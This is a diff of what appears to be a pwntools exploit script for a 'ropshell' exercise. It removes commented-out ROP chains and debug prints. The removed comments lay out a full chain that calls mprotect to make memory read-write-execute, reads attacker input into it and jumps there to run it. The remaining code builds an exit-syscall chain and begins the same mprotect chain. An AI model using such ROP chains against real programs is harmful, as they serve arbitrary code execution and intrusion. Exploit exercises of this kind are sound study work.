@@ -78,15 +78,6 @@ def code_bytes_find(target_asm):
 def task1_byte():
     global start_code_address
 
-    # send_line = b''.join([
-    #     p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
-    #     p64(60),
-    #     p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
-    #     p64(37),
-    #     p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
-    # ])
-    # print("send_line\n", send_line)
-
     send_line = flat(
         code_bytes_find(asm("pop rax\nret")) + start_code_address,
         60,
@@ -95,7 +86,6 @@ def task1_byte():
         code_bytes_find(asm("syscall\nret")) + start_code_address,
         endianness = 'little'
     )
-    print("send_line\n", send_line)
 
     return send_line
 
@@ -108,70 +98,6 @@ def mprotect_byte():
     # 1. open memory = codeint to be able to read & write & execute
     # 2. read user input
     # ropshell will clean the register before executing
-
-    # send_line = b''.join([
-    #     # al is rax's LSB 8 bits, 0xa is 10, mprotect syscall number
-    #     # rax to place syscall number
-    #     p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
-    #     p64(10),
-    #     # rdi - page start
-    #     p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
-    #     p64(mprotect_address),
-    #     # rsi - page len
-    #     p64(code_bytes_find(asm("pop rsi\nret")) + start_code_address),
-    #     # p64(10*0x10000),
-    #     p64(40960),
-    #     # rdx - dl is LSB 8 bits, open mode -> read(0x1), write(0x2), exec(0x4) -(all or)-> 0x7
-    #     p64(code_bytes_find(asm("pop rdx\nret")) + start_code_address),
-    #     p64(7),
-    #     p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
-
-    #     # write syscall
-    #     p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
-    #     p64(1),
-    #     # fd (stdout)
-    #     p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
-    #     p64(1),
-    #     # buf addr
-    #     p64(code_bytes_find(asm("pop rsi\nret")) + start_code_address),
-    #     p64(start_code_address),
-    #     # len
-    #     p64(code_bytes_find(asm("pop rdx\nret")) + start_code_address),
-    #     p64(50),
-    #     p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
-
-    #     # read user input
-    #     # read syscall
-    #     p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
-    #     p64(0),
-    #     # fd (stdin)
-    #     p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
-    #     p64(0),
-    #     # buf addr
-    #     p64(code_bytes_find(asm("pop rsi\nret")) + start_code_address),
-    #     p64(start_code_address),
-    #     # len
-    #     p64(code_bytes_find(asm("pop rdx\nret")) + start_code_address),
-    #     p64(4096),
-    #     p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
-
-    #     # write syscall
-    #     p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
-    #     p64(1),
-    #     # fd (stdout)
-    #     p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
-    #     p64(1),
-    #     # buf addr
-    #     p64(code_bytes_find(asm("pop rsi\nret")) + start_code_address),
-    #     p64(start_code_address),
-    #     # len
-    #     p64(code_bytes_find(asm("pop rdx\nret")) + start_code_address),
-    #     p64(50),
-    #     p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
-
-    #     # go to execute the code here
-    #     p64(start_code_address),
-    # ])
 
     send_line = flat(
         # al is rax's LSB 8 bits, 0xa is 10, mprotect syscall number
